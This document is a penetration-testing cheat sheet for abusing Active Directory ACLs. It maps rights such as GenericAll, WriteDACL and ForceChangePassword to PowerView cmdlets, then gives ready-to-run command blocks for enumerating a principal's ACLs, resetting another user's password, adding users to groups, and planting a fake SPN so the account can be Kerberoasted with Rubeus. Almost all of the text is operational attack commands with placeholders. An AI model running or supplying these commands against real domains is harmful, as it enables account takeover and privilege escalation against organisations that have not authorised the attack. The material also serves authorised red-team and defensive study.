Access denied ACE			#Used within a DACL to show that a user or group is explicitly denied access to an object
Access allowed ACE		#Used within a DACL to show that a user or group is explicitly granted access to an object
System audit ACE			#Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred

ForceChangePassword 	#abused with Set-DomainUserPassword
Add Members 				#abused with Add-DomainGroupMember
GenericAll 					#abused with Set-DomainUserPassword or Add-DomainGroupMember
GenericWrite 				#abused with Set-DomainObject
WriteOwner 					#abused with Set-DomainObjectOwner
WriteDACL 					#abused with Add-DomainObjectACL
AllExtendedRights 			#abused with Set-DomainUserPassword or Add-DomainGroupMember
AddSelf 					#abused with Add-DomainGroupMember

### Enumeration
```
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid <USERNAME>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

Get-DomainGroup -Identity "<GROUP>" | select memberof
$sid = Convert-NameToSid "<GROUP>"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose
```
### ACL Abuse
#### PSCredential
```
$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password) 
```
#### ForceChangePassword
```
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity <USERNAME> -AccountPassword <PASSWORD> -Credential <CREDENTIAL> -Verbose
```
#### Add user to group
```
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential <CRED> -Verbose
Get-ADGroup -Identity "<GROUP>" -Properties * | Select -ExpandProperty Members
Get-DomainGroupMember -Identity "<GROUP>" | Select MemberName
```
#### Fake SPN - Kerberoastable
```
Set-DomainObject -Credential <CRED> -Identity <USERNAME> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:<USER> /nowrap /tgtdeleg
```